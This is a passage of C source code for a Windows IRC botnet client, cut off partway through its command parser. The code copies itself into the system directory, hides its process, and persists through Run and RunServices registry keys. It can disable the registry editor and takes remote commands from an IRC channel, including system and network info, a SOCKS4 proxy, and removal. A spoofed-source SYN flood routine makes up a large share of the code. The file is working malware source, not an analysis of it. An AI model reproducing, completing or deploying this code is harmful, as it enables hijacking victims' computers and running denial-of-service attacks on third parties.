 #include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>
 #include <winsock2.h>
 #include <wininet.h>
 #include <shellapi.h>
 #include <mmsystem.h>

 #include "b0rg.h"
 #include "b0rg2.h"

 #define WIN32_LEAN_AND_MEAN
 #pragma comment(lib, "Ws2_32.lib")

 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
	WSADATA wsadata;
	int i = 0, err = 0;
	HKEY key;
	char cfilename[256];
	char filename1[64];
	char sysdir[256];
	char tstr[256];
	DWORD cstat;
    HANDLE psnap;
    PROCESSENTRY32 pe32 = {0};
	int copies = 0;
	BOOL bkpserver = FALSE;
	BOOL noigcs;

	started = GetTickCount() / 1000;

	#ifndef NO_PING
 	HINSTANCE icmp_dll = LoadLibrary("ICMP.DLL");
    if (icmp_dll == 0) noicmp = TRUE;
 	else {
	 	fIcmpCreateFile  = (ICF)GetProcAddress(icmp_dll,"IcmpCreateFile");
 		fIcmpCloseHandle = (ICH)GetProcAddress(icmp_dll,"IcmpCloseHandle");
 		fIcmpSendEcho    = (ISE)GetProcAddress(icmp_dll,"IcmpSendEcho");
 		if (!fIcmpCreateFile || !fIcmpCloseHandle || !fIcmpSendEcho) {
	        noicmp = TRUE;
	    }
	}
	#endif

	HINSTANCE kernel32_dll = LoadLibrary("kernel32.dll");
	if (kernel32_dll) {
		fRegisterServiceProcess = (RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");
		fCreateToolhelp32Snapshot = (CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot");
		fProcess32First = (P32F)GetProcAddress(kernel32_dll, "Process32First");
		fProcess32Next = (P32N)GetProcAddress(kernel32_dll, "Process32Next");

		if (fRegisterServiceProcess) fRegisterServiceProcess(0, 1);
	}

	ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (ih == NULL) ih = 0;
	HINSTANCE wininet_dll = LoadLibrary("WININET.DLL");
    if (wininet_dll == 0) noigcse = TRUE;
 	else {
		fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");
		if (!fInternetGetConnectedState) {
			noigcs = TRUE;
		} else noigcs = TRUE;

	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
 		if (!fInternetGetConnectedStateEx) {
	        noigcse = TRUE;
	    } else noigcse = FALSE;
	}

	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	GetTempPath(sizeof(tempdir), tempdir);

	if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
		psnap = fCreateToolhelp32Snapshot(2, 0);
		if (psnap != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(psnap, &pe32)) {
				do {
					if (strncmp(cfilename+(strlen(cfilename)-strlen(pe32.szExeFile)), pe32.szExeFile, strlen(pe32.szExeFile)) == 0) copies++;
				} while (fProcess32Next(psnap, &pe32));
			}
			CloseHandle (psnap);
			if (copies > 1) exit(0);
		}
	}

	err = WSAStartup(MAKEWORD(1, 1), &wsadata);
	if (err != 0) return 0;
	if ( LOBYTE( wsadata.wVersion ) != 1 || HIBYTE( wsadata.wVersion ) != 1 ) {
		WSACleanup();
		return 0;
	}

	srand(GetTickCount());
	if (rndfilename) rndnick((char *)&filename); else strncpy(filename1, filename, sizeof(filename1)-1);

	GetSystemDirectory(sysdir, sizeof(sysdir));
	if (strstr(cfilename, sysdir) == NULL) {
		Sleep(1000);
		sprintf(tstr, "\\%s", filename1);
		while (CopyFile(cfilename, strcat(sysdir, tstr), FALSE) == FALSE) Sleep(2000);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;
		WSACleanup();
		if (CreateProcess(NULL, sysdir, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) exit(0);
	}

if (KillRegTools) {
	DWORD dwData;
	dwData = 0x00000001;
	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &key);
	RegSetValueEx(key, "DisableRegistryTools", 0, REG_DWORD,(LPBYTE) &dwData, sizeof(DWORD));
	RegCloseKey(key);
}
	if (regrun) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename)+1);
		RegCloseKey(key);
	}

	if (regrunservices) {
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
		RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename)+1);
		RegCloseKey(key);
	}

	memset(threadd, 0, sizeof(threadd));
	memset(cnick, 0, sizeof(cnick));
	memset(aliases, 0, sizeof(aliases));

	addthread("main thread");

	addpredefinedaliases();

	memset(log, 0, sizeof(log));
	addlog("bot started.");

	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
			#ifndef NO_CHECKCONNECTION
			if (!noigcs) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
			#endif

			err = irc_connect((void *)&mainirc);
			success = FALSE;
			if (err == 2) break;

			if (success) i--;

			Sleep(3000);
		}

		if (err == 2) break;

		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
		    strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}

	for (i = 0; i < 64; i++) closesocket(csock[i]);
	WSACleanup();

	return 0;
 }

///////////////////////////////////// SYN FLOOD ///////////////////////////
USHORT checksum(USHORT *buffer, int size) 
{ 
   unsigned long cksum=0; 

   while(size > 1) { cksum+=*buffer++; size -= 2; }
   if(size) cksum += *(UCHAR*)buffer; 
 
   cksum = (cksum >> 16) + (cksum & 0xffff); 
   cksum += (cksum >>16); 
   return (USHORT)(~cksum); 
}
 
u_long LookupAddress(const char* szHost)
{
   u_long nRemoteAddr = inet_addr(szHost);
   struct hostent *pHE;

   if (nRemoteAddr == INADDR_NONE)
       {
       pHE = gethostbyname(szHost);
       if (pHE == 0) return INADDR_NONE;
       nRemoteAddr = *((u_long*)pHE->h_addr_list[0]);
       }

   return nRemoteAddr;
}

long SendSyn(unsigned long TargetIP, unsigned int SpoofingIP, unsigned short TargetPort, int len)
{ 
   WSADATA WSAData; 
   SOCKET sock; 
   SOCKADDR_IN addr_in; 
   IPHEADER ipHeader; 
   TCPHEADER tcpHeader; 
   PSDHEADER psdHeader; 
 
   LARGE_INTEGER freq, halt_time, cur;
   char szSendBuf[60]={0}; 
   BOOL flag; 
   int rect;
   long total;
   char buf[64];

   if (WSAStartup(MAKEWORD(2,2), &WSAData)!=0) 
       return FALSE; 
 
   if ((sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED ))==INVALID_SOCKET)
       return FALSE; 

   flag=TRUE;
   if (setsockopt(sock,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag))==SOCKET_ERROR)
       return FALSE; 

   addr_in.sin_family=AF_INET;
   addr_in.sin_port=htons(TargetPort);
   addr_in.sin_addr.s_addr=TargetIP;

   ipHeader.h_verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
   ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(tcpHeader));
   ipHeader.ident=1;
   ipHeader.frag_and_flags=0;
   ipHeader.ttl=128;
   ipHeader.proto=IPPROTO_TCP;
   ipHeader.checksum=0;
   ipHeader.destIP=TargetIP;
   tcpHeader.th_dport=htons(TargetPort);
   tcpHeader.th_ack=0;
   tcpHeader.th_lenres=(sizeof(tcpHeader)/4<<4|0); 
   tcpHeader.th_flag=2; 
   tcpHeader.th_win=htons(16384); 
   tcpHeader.th_urp=0; 
 
   total = 0;
   QueryPerformanceFrequency(&freq);
   QueryPerformanceCounter(&cur);
   halt_time.QuadPart = (freq.QuadPart * len) + cur.QuadPart;
 
   while(TRUE) 
      {
      tcpHeader.th_sum=0; 
 
      psdHeader.daddr=ipHeader.destIP; 
      psdHeader.mbz=0; 
      psdHeader.ptcl=IPPROTO_TCP; 
      psdHeader.tcpl=htons(sizeof(tcpHeader)); 
      ipHeader.sourceIP=htonl(SpoofingIP++); 

      tcpHeader.th_sport=htons((rand() % 1001) + 1000 ); // source port 
      tcpHeader.th_seq=htons((rand() << 16) | rand());
 
      psdHeader.saddr=ipHeader.sourceIP; 
 
      memcpy(szSendBuf, &psdHeader, sizeof(psdHeader)); 
      memcpy(szSendBuf+sizeof(psdHeader), &tcpHeader, sizeof(tcpHeader)); 
      tcpHeader.th_sum=checksum((USHORT *)szSendBuf,sizeof(psdHeader)+sizeof(tcpHeader)); 
 
      memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
      memcpy(szSendBuf+sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader)); 
      memset(szSendBuf+sizeof(ipHeader)+sizeof(tcpHeader), 0, 4); 
      ipHeader.checksum=checksum((USHORT *)szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader)); 
 
      memcpy(szSendBuf, &ipHeader, sizeof(ipHeader)); 
 
      rect=sendto(sock, szSendBuf, sizeof(ipHeader)+sizeof(tcpHeader),0,(struct sockaddr*)&addr_in, sizeof(addr_in));
      if (rect==SOCKET_ERROR)
         {
          sprintf(buf, "send error!:%d\n",WSAGetLastError());
          addlog(buf);
          return 0;
         }
     
      total += rect;
      QueryPerformanceCounter(&cur);
      if (cur.QuadPart >= halt_time.QuadPart)
         break;
     }

   closesocket(sock); 
   WSACleanup(); 
 
   return (total);
}

long SYNFlood(char *target, char *port, char *len)
{
   unsigned long TargetIP;
   unsigned short p;
   unsigned int SpoofIP;
   long num;
   int t;
   char buf[80];

   TargetIP = LookupAddress((const char *)target);
   p = atoi(port);
   t = atoi(len);
   SpoofIP = TargetIP + ((rand()%512)+256);

   num = SendSyn(TargetIP, SpoofIP, p, t);

   #ifdef REMOVE_NONSYNNERS
   if (!num)
       {
       uninstall();
       WSACleanup();
       ExitProcess(0);
       }
   #endif

   if (!num) num = 1;  // 'Div by zero' kludge
   num = num / 1000 / t;

   sprintf(buf, "syn flood: %s:%s [%iKB/sec]", target, port, num);
   addlog(buf);
   return num;
}
///////////////////////////////////// SYN FLOOD ///////////////////////////

 char * decryptstr(char *str, int strlen)
 {
	if (cryptkey != 0) for (BYTE i = 0; i < strlen; i++) str[i] = str[i] ^ (cryptkey + (i * (cryptkey % 10) + 1));
	return str;
}

 void addlog(char *desc)
 {
	SYSTEMTIME st;

	GetLocalTime(&st);

	for (int i = 126; i >= 0; i--) if (log[i][0] != '\0') strncpy(log[i+1], log[i], sizeof(log[i+1])-1);
	sprintf(log[0], "[%d-%d-%d %d:%d:%d] %s", st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond, desc);
 }

 int addalias(char *name, char *command)
 {
	int i;
	for (i = 0; i < maxaliases; i++) {
		if (aliases[i].name[0] == '\0' || strcmp(aliases[i].name, name) == 0) {
			memset(&aliases[i], 0, sizeof(aliases[i]));
			strncpy(aliases[i].name, name, sizeof(aliases[i].name)-1);
			strncpy(aliases[i].command, command, sizeof(aliases[i].command)-1);
			anum++;
			break;
		}
	}
	return i;
 }

 int addthread(char *desc)
 {
	int i;
	for (i = 0; i < 64; i++) {
		if (threadd[i][0] == '\0') {
			strncpy(threadd[i], desc, sizeof(threadd[i])-1);
			break;
		}
	}
	return i;
 }

 DWORD WINAPI irc_connect(LPVOID param)
 {
	SOCKET sock;
	SOCKADDR_IN ssin;
	IN_ADDR iaddr;
	LPHOSTENT hostent;
	DWORD err;
	int rval;
	char nick[16];
	char *nick1;
	char str[64];
	BYTE spy;
	ircs irc;

	irc = *((ircs *)param);
	ircs *ircp = (ircs *)param;
	ircp->gotinfo = TRUE;

	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(irc.port);
		iaddr.s_addr = inet_addr(irc.host);
		if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(irc.host);
		else hostent = gethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
		if (hostent == NULL) return 0;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

		memset(nick, 0, sizeof(nick));
		if (irc.spy == 1) nick1 = irc.nick; else {
			nick1 = rndnick(nick);
		}

		#ifndef NO_IDENT
		CreateThread(NULL, 0, &ident, NULL, 0, &err);
		#endif

		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		csock[irc.threadnum] = sock;
		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) {
			closesocket(sock);
			Sleep(2000);
			continue;
		}

		sprintf(str, "connected to %s.", irc.host);
		addlog(str);

		strncpy(cnick[irc.threadnum], nick1, sizeof(cnick[irc.threadnum])-1);

		if (irc.spy == 1) spy = 1; else spy = 0;
		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, spy);
		closesocket(sock);

		if (rval == 0) continue;
		if (rval == 1) {
			Sleep(1800000);
			continue;
		}
		if (rval == 2) break;
	}

	threads[irc.threadnum] = 0;
	threadd[irc.threadnum][0] = '\0';
	cnick[irc.threadnum][0] = '\0';
	return rval;
 }

 #ifndef NO_IDENT
 DWORD WINAPI ident(LPVOID param)
 {
	SOCKET isock, csock;
	SOCKADDR_IN issin, cssin;
	char user[12];
	char ibuff[32];

	isock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	WSAAsyncSelect(isock, 0, WM_USER + 1, FD_READ);
	memset(&issin, 0, sizeof(issin));
	issin.sin_family = AF_INET;
	issin.sin_port = htons(113);
	bind(isock, (SOCKADDR *)&issin, sizeof(issin));

	while(1) {
		if (listen(isock, 10) == SOCKET_ERROR) return 0;
		csock = accept(isock, (SOCKADDR *)&cssin, NULL);
		if (csock != INVALID_SOCKET) break;
	}

	memset(user, 0, sizeof(user));
	srand(GetTickCount());
	rndnick(user);

	memset(ibuff, 0, sizeof(ibuff));
	sprintf(ibuff, "%d, %d : USERID : UNIX : %s\r\n", rand()%6000+1, port, (char *)user); // build ident reply
	send(csock, ibuff, strlen(ibuff), 0);

	closesocket(csock);
	closesocket(isock);

	return 0;
 }
 #endif

char * rndnick(char *strbuf)
 {
    int i;
    LPTSTR lpszCompName="goatse";
    DWORD cchBuff = 256;

    srand(GetTickCount());
    if(!GetComputerName(lpszCompName, &cchBuff)) lpszCompName="goatse";
    BOOL NameGood = FALSE;
    for (int j=65;j<91;j++) {if (lpszCompName[0] == j){NameGood = TRUE;}}
    for (int k=97;k<123;k++) {if (lpszCompName[0] == k){NameGood = TRUE;}}
    if (!NameGood) lpszCompName="goatse";
    sprintf(strbuf, "%s", lpszCompName);
    for (i=1; i<=maxrand; i++) sprintf(strbuf, "%s%i", strbuf, rand()%10);
    return strbuf;
 }

 int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, BYTE spy)
 {
	char buff[4096];
	int err, repeat;
	char master[128*maxlogins];
	char *b;
	char str[8];
	char login[64];
	char line[512];
	int in_channel;

	repeat = 0;
	memset(master, 0, sizeof(master));


	if (serverpass[0] != '\0') {
		sprintf(login, "PASS %s\r\n", serverpass);
		send(sock, login, strlen(login), 0);
	}
	sprintf(login, "NICK %s\r\n"
				   "USER %s 0 0 :%s\r\n", nick1, rndnick(str), nick1);
	err = send(sock, login, strlen(login), 0);
	if (err == SOCKET_ERROR) {
		closesocket(sock);
		Sleep(5000);
		return 0;
	}

	while(1) {
		char host[160];

		memset(buff, 0, sizeof(buff));
		err = recv(sock, buff, sizeof(buff), 0);
		if (err == 0) break;
		if (err == SOCKET_ERROR) break;

		memset(line, 0, sizeof(line));
		b = strtok(buff, "\r");
		if (b != NULL) strncpy(line, b, sizeof(line)-1); else b = NULL;
		while (b != NULL) {
			#ifndef NO_SPY
			if (spy == 1) repeat = irc_spyparseline(line, sock, channel, chanpass, nick1, hsock, hchannel, server);
			#endif
			if (spy == 0) {
				repeat = 1;
				do {
					repeat = irc_parseline(line, sock, channel, chanpass, nick1, server, master, host, &in_channel, repeat);
					repeat--;
				} while (repeat > 0);
				if (repeat == -1) return 0;
				else if (repeat == -2) return 1;
				else if (repeat == -3) return 2;
			}

			b = strtok(b+strlen(b)+1, "\r");
			if (b != NULL) if (b[strlen(b)+2] != '\n' && b[strlen(b)+3] != '\0') strncpy(line, b+1, sizeof(line)-1); else b = NULL;
		}
	}

	return 0;
 }

 int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char *master, char *host, int *in_channel, int repeat)
 {
	char line1[512];
	char line2[512];
	char *masters[maxlogins];
	BOOL ismaster;
	char ntmp[12];
	char ntmp2[3];
	int i, ii, s;
	char *a[32];
	char a0[128];
	char nick[16];
	char user[24];
	char sendbuf[512];
	DWORD id;
	BOOL silent = FALSE;
	BOOL notice = FALSE;
	BOOL usevars = FALSE;
	int cl;

	memset(sendbuf, 0, sizeof(sendbuf));

	id = 0;
	strncpy(nick, nick1, sizeof(nick)-1);
	for (i = 0; i < maxlogins; i++) masters[i] = master + (i * 128);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL) return 1;

	for (i = 3; i < 32; i++) if (a[i] == NULL && a[i-1] != NULL) {
		if (strcmp(a[i-1], "-s") == 0) silent = TRUE;
		break;
	}

	for (i = 3; i < 32; i++) if (a[i] == NULL && a[i-1] != NULL) {
		if (strcmp(a[i-1], "-n") == 0) notice = TRUE;
		break;
	}

	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}

	if (strcmp("PING", a[0]) == 0) {
		irc_sendf(sock, "PONG %s\r\n", a[1]+1);
		if (in_channel == 0) {
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}

	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		#ifndef NO_MODEONCONN
		irc_sendf2(sock, "MODE %s %s\r\n", nick1, modeonconn);
		#endif
		irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
		irc_sendf(sock, "USERHOST %s\r\n", nick1);
		success = TRUE;
		return 1;
	}

	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL) strncpy(host,  h+1, 159);
		return 1;
	}
        
	if (strcmp("433", a[1]) == 0) {
		rndnick(nick1);
		irc_sendf(sock, "NICK %s\r\n", nick1);
		return 1;
	}

	ismaster = FALSE;
	for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a0) == 0) ismaster = TRUE;

	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < maxlogins; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL) if (strcmp(knick, a[3]) == 0) {
				masters[i][0] = '\0';
				sprintf(sendbuf,"user %s logged out.", knick);
				irc_sendf2(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
				addlog(sendbuf);
			}
		}
		if (strcmp(nick1, a[3]) == 0) {
			in_channel = 0;
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
			sprintf(sendbuf, "screw you %s!", user);
			irc_privmsg(sock, a[2], sendbuf, FALSE);
		}
		return 1;
	}

	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user;
		char *newnck = a[2] + 1;
		if (oldnck != NULL && newnck != NULL)  {
			for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a0) == 0) replacestr(masters[i], oldnck-1, newnck-1);
			if (strcmp(oldnck, nick1) == 0) strncpy(nick1,  newnck, 15);
		}
		return 1;
	}

	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) for (i = 0; i < maxlogins; i++) if (masters[i][0] != '\0') if (strcmp(masters[i], a[0]) == 0) {
		masters[i][0] = '\0';
		sprintf(sendbuf, "user %s logged out.", user);
		addlog(sendbuf);
		if (strcmp("PART", a[1]) == 0) irc_sendf2(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
		return 1;
	}

	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0) *in_channel = 1;
		sprintf(sendbuf, "joined channel %s.", a[4]);
		addlog(sendbuf);
		return 1;
	}

	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {
			if (strcmp("NOTICE", a[1]) == 0) notice = TRUE;
			if (a[2] == NULL) return 1;
			if (strstr(a[2], "#") == NULL || notice) a[2] = user; 
			if (a[3] == NULL) return 1; 
			a[3]++; 
			if (a[3] && nick1) if (strncmp(nick1, a[3], strlen(nick1)) == 0) s = 4; else s = 3; 
			if (a[3] && nick1) if (strncmp(nick1, a[3], strlen(nick1)) == 0) s = 4; else s = 3; 
			if (a[s] == NULL) return 1;
		if (strcmp("\1VERSION\1", a[s]) == 0) if (a[2][0] != '#' && version[0] != '\0') {
				irc_sendf2(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)version);
				return 1;
			}
			else if (strcmp("\1PING", a[s]) == 0) if (a[s+1] != NULL && a[2][0] != '#') {
				irc_sendf2(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
				return 1;
			}
		} else  {
			s = 4;
			a[4]++;
			a[2] = a[3];
		}

		if (a[s]++[0] != prefix1) return 1;
	if (strcmp("auth", a[s]) == 0)
    {
    if (a[s+1] == NULL) return 1;
    if (ismaster || strstr(a[2], "#") == NULL) return 1;

    char *u = strtok(a[0], "!") + 1;
    char *h = strtok(NULL, "\0");

    if (strcmp(password, a[s+1]) != 0)
        {
        addlog(sendbuf);
        return 1;
        }
    if (!HostMaskMatch(h))
        {
        addlog(sendbuf);
        return 1;
        }
    for(i = 0; i < maxlogins; i++)
        {
        if (a[s+1] == NULL) return 1;
        if (masters[i][0] != '\0') continue;
        if (strcmp(password, a[s+1]) == 0)
            {
            strncpy(masters[i],  a0, 127);
            if (!silent) irc_privmsg(sock, a[2], "password accepted.", notice);
            sprintf(sendbuf, "user %s(%s) logged in.", u, h);
            addlog(sendbuf);
            break;
            }
        }
    return 1;
    }

		if (ismaster || strcmp("332", a[1]) == 0) {
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					char *sc = strstr(line, " :");
					if (sc == NULL) return 1;
					sc[2] = prefix1;
					sc[3] = prefix1;
					strncpy(sc+4, aliases[i].command, 159);

					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							x = x + strlen(aliases[i].name);
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
						else if (a[s+ii+1] == NULL) {
							strncpy(ntmp2, ntmp, 2);
							ntmp2[2] = '\0';
							replacestr(line, ntmp, ntmp2);
						}
					}

					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL) replacestr(line, ntmp, a[s+ii]);
					}

					usevars = TRUE;
					break;
				}
			}

			if (a[s][0] == prefix1 || usevars) {
				replacestr(line, "$me", nick1);
				replacestr(line, "$user", user);
				replacestr(line, "$chan", a[2]);
				replacestr(line, "$rndnick", rndnick(ntmp));
				replacestr(line, "$server", server);

				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57)  strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0) ntmp2[0] = atoi(ntmp); else ntmp2[0] = (rand()%96) + 32;
					ntmp2[1] = '\0';
					cl = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, cl+6);
					replacestr(line, ntmp, ntmp2);
				}

				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++) a[i] = strtok(NULL, " ");
				if (a[s] == NULL) return 1;
				a[s] += 3;
			}

			if (strcmp("rndnick", a[s]) == 0) {
				rndnick(nick);
				irc_sendf(sock, "NICK %s\r\n", nick);
			}
			else if (strcmp("die", a[s]) == 0) {
				if (strcmp("332", a[1]) != 0) exit(0);
			}
			else if (strcmp("logout", a[s]) == 0) {
				for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "user %s logged out.\r\n", user);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				}
			}
			else if (strcmp("reconnect", a[s]) == 0) {
				irc_send(sock, "QUIT :reconnecting");
				return 0;
			}
			else if (strcmp("disconnect", a[s]) == 0) {
				irc_send(sock, "QUIT :later");
				return -1;
			}
			else if (strcmp("quit", a[s]) == 0) {
				if (a[s+1] == NULL) irc_send(sock, "QUIT :later\r\n"); else {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendf(sock, "QUIT :%s\r\n", y);
					}
				}
				return -2;
			}
			else if (strcmp("status", a[s]) == 0) {
				DWORD total, days, hours, minutes;
				total = (GetTickCount() / 1000) - started;
				days = total / 86400;
				hours = (total % 86400) / 3600;
				minutes = ((total % 86400) % 3600) / 60;
				sprintf(sendbuf, vername" ready. Up %dd %dh %dm.", days, hours, minutes);
				irc_privmsg(sock, a[2], sendbuf, notice);
			}
			else if (strcmp("id", a[s]) == 0) irc_privmsg(sock, a[2], (char *)botid, notice);
			else if (strcmp("threads", a[s]) == 0 || strcmp("t", a[s]) == 0) {
				irc_privmsg(sock, a[2], "-[thread list]-", notice);
				for (i = 0; i < 64; i++) {
					if (threadd[i][0] != '\0') {
						sprintf(sendbuf, "%d. %s", i, threadd[i]);
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
			}
			else if (strcmp("aliases", a[s]) == 0) {
				irc_privmsg(sock, a[2], "-[alias list]-", notice);
				for (i = 0; i < maxaliases; i++) {
					if (aliases[i].name[0] != '\0') {
						sprintf(sendbuf, "%d. %s = %s", i, aliases[i].name, aliases[i].command);
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
			}
			else if (strcmp("log", a[s]) == 0) {
				for (i = 0; i < 128; i++) {
					if (log[i][0] != '\0') {
						irc_privmsg(sock, a[2], log[i], notice);
					}
				}
			}
			#ifndef NO_NETINFO
			else if (strcmp("netinfo", a[s]) == 0) irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
			#endif
			#ifndef NO_SYSINFO
			else if (strcmp("sysinfo", a[s]) == 0) irc_privmsg(sock, a[2], sysinfo(sendbuf), notice);
			#endif
			else if (strcmp("rem0ve", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "removing bot...", notice);
				uninstall();
				WSACleanup();
				exit(0);
			}
			else if (strcmp("remove", a[s]) == 0) {
				irc_privmsg(sock, a[2], "removing bot...", notice);
				Sleep(3000);
				irc_send(sock, "QUIT :good bye cruel world!");
				WSACleanup();

				strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
				mainirc.port = port2;
				strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
				strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
				irc_connect((void *)&mainirc);
				return 0;
			}
			#ifndef NO_SOCK4SERV
			else if (strcmp("s0ck4", a[s]) == 0) {
				CreateThread(NULL, 0, &SocksDaemon, NULL, 0, &id);
				sprintf(sendbuf, "socks4 daemon started.\r\n", user);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
			}
			#endif
			else if (a[s+1] == NULL) return 1;
